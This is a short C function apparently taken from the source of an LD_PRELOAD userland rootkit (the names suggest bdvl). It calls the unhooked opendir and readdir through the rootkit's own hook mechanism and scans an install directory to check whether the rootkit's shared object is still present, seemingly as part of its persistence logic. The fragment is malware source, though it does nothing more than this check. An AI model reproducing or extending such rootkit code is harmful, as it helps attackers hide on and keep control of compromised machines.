int _rknomore(char *installdir, char *bdvlso){
    DIR *dp;
    struct dirent *dir;
    int status = 1;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, installdir);
    if(dp == NULL) return 1;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strncmp(".", dir->d_name, 1))
            continue;

        if(!strncmp(bdvlso, dir->d_name, strlen(bdvlso))){
            status = 0;
            break;
        }
    }
    closedir(dp);

    return status;
}